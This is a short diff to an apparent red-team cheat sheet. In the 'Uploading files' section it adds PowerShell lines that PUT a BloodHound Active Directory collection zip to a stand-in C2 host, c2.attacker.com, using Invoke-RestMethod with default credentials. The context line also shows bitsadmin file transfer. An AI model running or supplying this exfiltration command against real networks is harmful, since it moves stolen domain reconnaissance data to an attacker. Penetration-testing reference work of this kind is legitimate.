@@ -124,6 +124,8 @@ bitsadmin /create JOB & bitsadmin /addfile JOB %TEMP%\test1.txt %TEMP%\test2.txt
 * Uploading files
     * Setup a [Simple HTTP Server](../Infrastructure_Setup/Simple_Python_Go_Packages.html#projectdiscovery-simplehttpserver) for this command.
     ```
+    $uri = "https://c2.attacker.com/bh.zip"
+    $uploadPath = "C:\Windows\temp\20210101000109_BloodHound.zip"
     Invoke-RestMethod -Uri $uri -Method Put -InFile $uploadPath -UseDefaultCredentials
     ```
 
